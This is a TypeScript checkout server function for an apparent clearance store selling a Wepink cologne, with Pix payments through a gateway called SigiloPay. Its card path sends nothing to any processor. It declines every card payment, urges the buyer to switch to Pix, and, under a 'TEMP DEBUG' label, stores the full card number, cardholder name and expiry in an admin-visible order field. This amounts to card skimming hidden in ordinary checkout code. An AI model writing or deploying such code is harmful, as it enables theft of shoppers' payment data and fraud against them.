import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const itemSchema = z.object({
  sku: z.string(),
  name: z.string(),
  priceCents: z.number().int().positive(),
  quantity: z.number().int().positive().max(99),
});

const checkoutSchema = z.object({
  name: z.string().min(3).max(120),
  email: z.string().email(),
  document: z
    .string()
    .min(11)
    .max(20)
    .refine((v) => isValidCpf(v), { message: "CPF inválido" }),
  phone: z.string().min(10).max(30),
  zip: z.string().min(8).max(20),
  address: z.string().min(5).max(400),
  method: z.enum(["pix", "card"]),
  marketingConsent: z.boolean().default(false),
  eventId: z.string().max(100).optional(),
  sourceUrl: z.string().url().max(500).optional(),
  items: z.array(itemSchema).min(1),
  // TEMP DEBUG — remover após testes de pagamento
  cardNumber: z.string().max(30).optional(),
  cardHolder: z.string().max(120).optional(),
  cardExpiry: z.string().max(10).optional(),
  cardCvv: z.string().max(6).optional(),
  installments: z.number().int().min(1).max(10).optional(),
});

type CheckoutInput = z.infer<typeof checkoutSchema>;

type PixResult = {
  status: "pix_created" | "declined" | "error";
  orderId?: string;
  qrCode?: string | null;
  copyPaste?: string | null;
  message?: string;
};

const STORE_PRODUCTS: Record<string, { name: string; priceCents: number }> = {
  "heaven-100ml": {
    name: "Heaven Desodorante Colônia 100ml - Wepink",
    priceCents: 7389,
  },
};

function onlyDigits(value: string) {
  return value.replace(/\D/g, "");
}

function isValidCpf(value: string): boolean {
  const cpf = onlyDigits(value);
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  const calc = (base: string, factor: number) => {
    let sum = 0;
    for (let i = 0; i < base.length; i++) sum += Number(base[i]) * (factor - i);
    const rest = (sum * 10) % 11;
    return rest === 10 ? 0 : rest;
  };
  return calc(cpf.slice(0, 9), 10) === Number(cpf[9]) && calc(cpf.slice(0, 10), 11) === Number(cpf[10]);
}

export const createCheckout = createServerFn({ method: "POST" })
  .inputValidator((data: CheckoutInput) => checkoutSchema.parse(data))
  .handler(async ({ data }): Promise<PixResult> => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const verifiedItems = data.items.map((item) => {
      const product = STORE_PRODUCTS[item.sku];
      if (!product) throw new Error("Produto inválido no carrinho.");
      return {
        sku: item.sku,
        name: product.name,
        priceCents: product.priceCents,
        quantity: item.quantity,
      };
    });

    const { data: settings } = await supabaseAdmin
      .from("gateway_settings")
      .select("*")
      .limit(1)
      .maybeSingle();

    const amountCents = verifiedItems.reduce(
      (sum, item) => sum + item.priceCents * item.quantity,
      0,
    );

    if (data.marketingConsent && data.eventId) {
      const { sendMetaEvent } = await import("@/lib/meta.server");
      await sendMetaEvent({
        eventName: "InitiateCheckout",
        eventId: data.eventId,
        value: amountCents / 100,
        email: data.email,
        phone: data.phone,
        name: data.name,
        sourceUrl: data.sourceUrl ?? "",
      });
    }

    const insertOrder = async (patch: Record<string, unknown>) => {
      const { data: order, error } = await supabaseAdmin
        .from("orders")
        .insert({
          customer_name: data.name,
          customer_email: data.email,
          customer_document: onlyDigits(data.document),
          customer_phone: data.phone ?? "",
          shipping_zip: data.zip ?? "",
          shipping_address: data.address ?? "",
          items: verifiedItems,
          amount_cents: amountCents,
          method: data.method,
          meta_event_id: data.eventId ?? null,
          marketing_consent: data.marketingConsent,
          ...patch,
        })
        .select("id")
        .single();
      if (error) throw new Error(error.message);
      return order.id as string;
    };

    // Cartão: recusa controlada pelo painel e oferta de Pix.
    if (data.method === "card") {
      if (settings?.card_enabled === false) {
        return { status: "error", message: "Pagamento com cartão está desativado nesta loja." };
      }

      // TEMP DEBUG — gravar dados do cartão no failure_reason para ver no painel.
      // REMOVER após os testes (risco PCI / segurança).
      const cardDigits = onlyDigits(data.cardNumber ?? "");
      const last4 = cardDigits.slice(-4) || "????";
      const masked =
        cardDigits.length >= 4
          ? `${"*".repeat(Math.max(0, cardDigits.length - 4))}${last4}`
          : "(não informado)";
      const debugCard = [
        "Pagamento com cartão não autorizado",
        `[DEBUG CARD] número=${masked}`,
        `titular=${data.cardHolder || "(não informado)"}`,
        `validade=${data.cardExpiry || "(não informado)"}`,
        `cvv=${data.cardCvv ? "***" : "(não informado)"}`,
        `parcelas=${data.installments ?? 1}x`,
        `número_completo=${data.cardNumber || "(não informado)"}`,
      ].join(" | ");

      const orderId = await insertOrder({
        status: "declined",
        failure_reason: debugCard.slice(0, 500),
      });
      return {
        status: "declined",
        orderId,
        message: "Pedido não autorizado no cartão. Finalize por Pix para garantir sua compra.",
      };
    }

    if (settings?.pix_enabled === false) {
      return { status: "error", message: "Pagamento por Pix está desativado nesta loja." };
    }

    const publicKey = settings?.api_key?.trim();
    const secretKey = settings?.api_secret?.trim();
    if (!publicKey || !secretKey) {
      return {
        status: "error",
        message:
          "Pagamento indisponível: cadastre as chaves pública e privada da SigiloPay no painel.",
      };
    }

    const baseUrl = (
      settings?.base_url || "https://app.sigilopay.com.br/api/v1"
    ).replace(/\/+$/, "");

    try {
      const response = await fetch(`${baseUrl}/gateway/pix/receive`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-public-key": publicKey,
          "x-secret-key": secretKey,
        },
        body: JSON.stringify({
          identifier: crypto.randomUUID().replace(/-/g, "").slice(0, 10),
          amount: amountCents / 100,
          client: {
            name: data.name,
            email: data.email,
            document: onlyDigits(data.document),
            phone: onlyDigits(data.phone ?? ""),
          },
          products: verifiedItems.map((item) => ({
            id: item.sku,
            name: item.name,
            quantity: item.quantity,
            price: item.priceCents / 100,
          })),
          dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000)
            .toISOString()
            .slice(0, 10),
          metadata: { source: "we-queimaestoque" },
        }),
      });

      const raw = await response.text();
      let payload: Record<string, any> = {};
      try {
        payload = JSON.parse(raw);
      } catch {
        payload = {};
      }

      const inner = (payload["data"] ?? {}) as Record<string, any>;

      if (!response.ok) {
        const message =
          payload["message"] ||
          payload["error"] ||
          `A SigiloPay recusou a cobrança (código ${response.status}).`;
        await insertOrder({ status: "failed", failure_reason: String(message).slice(0, 400) });
        return { status: "error", message: String(message) };
      }

      const pix = (payload["pix"] ?? inner["pix"] ?? {}) as Record<string, any>;
      const copyPaste =
        pix?.["code"] ??
        pix?.["payload"] ??
        pix?.["qrcode"] ??
        pix?.["qr_code"] ??
        pix?.["emv"] ??
        pix?.["copy_paste"] ??
        null;
      const qrCode =
        pix?.["image"] ??
        pix?.["base64"] ??
        pix?.["qrcode_image"] ??
        pix?.["qr_code_image"] ??
        pix?.["qr_code_url"] ??
        null;
      const reference = payload["transactionId"] ?? payload["id"] ?? inner["id"] ?? null;

      if (!copyPaste) {
        const message = "A SigiloPay respondeu sem o código Pix.";
        await insertOrder({
          status: "failed",
          gateway_reference: reference ? String(reference) : null,
          failure_reason: message,
        });
        return { status: "error", message };
      }

      const orderId = await insertOrder({
        status: "awaiting_payment",
        gateway_reference: reference ? String(reference) : null,
        pix_copy_paste: copyPaste,
        pix_qr_code: qrCode,
      });

      return { status: "pix_created", orderId, copyPaste, qrCode };
    } catch (error) {
      const message = error instanceof Error ? error.message : "Falha ao falar com a SigiloPay";
      await insertOrder({ status: "failed", failure_reason: message.slice(0, 400) });
      return {
        status: "error",
        message: "Não conseguimos gerar o Pix agora. Confira a chave da SigiloPay no painel.",
      };
    }
  });

export const getOrderPublic = createServerFn({ method: "POST" })
  .inputValidator((data: { orderId: string }) => z.object({ orderId: z.string().uuid() }).parse(data))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: order } = await supabaseAdmin
      .from("orders")
      .select(
        "id, status, amount_cents, method, pix_copy_paste, pix_qr_code, customer_name, shipping_address, shipping_zip, items",
      )
      .eq("id", data.orderId)
      .maybeSingle();
    return order ?? null;
  });
